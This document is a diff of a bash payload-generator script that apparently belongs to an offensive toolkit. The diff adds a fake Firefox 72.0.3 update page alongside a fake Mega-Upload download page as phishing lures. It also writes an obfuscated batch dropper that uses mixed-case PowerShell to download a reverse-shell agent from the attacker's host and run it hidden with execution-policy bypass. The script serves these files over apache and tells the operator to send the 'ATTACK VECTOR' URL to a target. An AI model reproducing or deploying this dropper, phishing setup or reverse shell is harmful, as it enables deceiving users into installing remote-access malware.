@@ -12055,10 +12055,18 @@ echo "\$writer.close();\$socket.close();" >> $IPATH/output/$NaM.ps1
 
 
 ## Building Download webpage
-cd $IPATH/templates/phishing
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
-sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
-mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "FireFox Browser 72.0.3" --width 350 --height 200) > /dev/null 2>&1
+if [ "$phish" = "Mega-Upload (default)" ]; then
+    cd $IPATH/templates/phishing
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
+   mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+else
+   cd $IPATH/templates/phishing/firefox
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Firefox_Browser.html
+   mv Firefox_Browser.html $ApAcHe/Firefox_Browser.html > /dev/nul 2>&1
+   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+fi
 cd $IPATH
 
 
@@ -12076,7 +12084,11 @@ cd $IPATH
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
 echo "${BlueF}---"
 echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
-echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+if [ "$phish" = "Mega-Upload (default)" ]; then
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+else
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/Firefox_Browser.html"
+fi
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
@@ -12093,6 +12105,8 @@ rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/mega1.html > /dev/nul 2>&1
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
+rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+rm $ApAcHe/Firefox_Browser.html > /dev/nul 2>&1
 sh_menu
 }
 
@@ -12129,13 +12143,17 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: revshell" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
+
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$Drop" ]; then Drop="dropper";fi
 if [ -z "$NaM" ]; then NaM="revshell";fi
+if [ -z "$rpath" ]; then rpath="%tmp%";fi
+if [ -z "$Drop" ]; then Drop="dropper";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
+
 
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
@@ -12143,18 +12161,23 @@ echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    UPLOAD   : FileLess (ram)
-    LOLBin   : WinHttpRequest
     CN NAME  : $CN
-    DROPPER  : $IPATH/output/$Drop.ps1
+    LOLBin   : Powershell (DownloadFile)
+    UPLOAD   : $rpath\\\\$NaM.ps1
+    DROPPER  : $IPATH/output/$Drop.bat
     AGENT    : $IPATH/output/$NaM.ps1
 !
 echo "---"
 
 
 ## BUILD DROPPER
-echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
-echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
+# echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
+# echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
+echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
+echo "@echo off" > $IPATH/output/$Drop.bat
+echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.bat
+echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
+echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
 
 
 ## Build Reverse Powershell Shell
@@ -12198,16 +12221,25 @@ cd $IPATH
 
 
 ## Building Download webpage
-cd $IPATH/templates/phishing
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
-sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
-mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "FireFox Browser 72.0.3" --width 350 --height 200) > /dev/null 2>&1
+if [ "$phish" = "Mega-Upload (default)" ]; then
+    cd $IPATH/templates/phishing
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
+   mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+else
+   cd $IPATH/templates/phishing/firefox
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Firefox_Browser.html
+   mv Firefox_Browser.html $ApAcHe/Firefox_Browser.html > /dev/nul 2>&1
+   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+fi
 cd $IPATH
 
 
 ## Copy files to apache2 webroot
 cd $IPATH/output
-zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
+# zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
+zip $Drop.zip $Drop.bat > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
@@ -12219,7 +12251,11 @@ cd $IPATH
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
 echo "${BlueF}---"
 echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
-echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+if [ "$phish" = "Mega-Upload (default)" ]; then
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+else
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/Firefox_Browser.html"
+fi
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
@@ -12240,6 +12276,8 @@ rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 rm $IPATH/output/cert.pem > /dev/nul 2>&1
 rm $IPATH/output/key.pem > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
+rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+rm $ApAcHe/Firefox_Browser.html > /dev/nul 2>&1
 sh_menu
 }
 
@@ -12265,13 +12303,13 @@ sleep 2
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: security-update\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: updates\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: update-72.0.3\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$Drop" ]; then Drop="updates";fi
+if [ -z "$Drop" ]; then Drop="update-72.0.3";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$NaM" ]; then NaM="security-update";fi
 
@@ -12281,8 +12319,8 @@ echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    UPLOAD   : $rpath
     LOLBin   : Powershell (DownloadFile)
+    UPLOAD   : $rpath\\\\$NaM.ps1
     DROPPER  : $IPATH/output/$Drop.bat
     AGENT    : $IPATH/output/$NaM.ps1
 !
@@ -12325,10 +12363,18 @@ echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\
 
 
 ## Building Download webpage
-cd $IPATH/templates/phishing
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
-sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
-mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "FireFox Browser 72.0.3" --width 350 --height 200) > /dev/null 2>&1
+if [ "$phish" = "Mega-Upload (default)" ]; then
+    cd $IPATH/templates/phishing
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
+   mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+else
+   cd $IPATH/templates/phishing/firefox
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Firefox_Browser.html
+   mv Firefox_Browser.html $ApAcHe/Firefox_Browser.html > /dev/nul 2>&1
+   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+fi
 cd $IPATH
 
 
@@ -12346,7 +12392,11 @@ cd $IPATH
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
 echo "${BlueF}---"
 echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
-echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+if [ "$phish" = "Mega-Upload (default)" ]; then
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+else
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/Firefox_Browser.html"
+fi
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
@@ -12365,6 +12415,8 @@ rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/mega1.html > /dev/nul 2>&1
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
+rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+rm $ApAcHe/Firefox_Browser.html > /dev/nul 2>&1
 sh_menu
 }
 
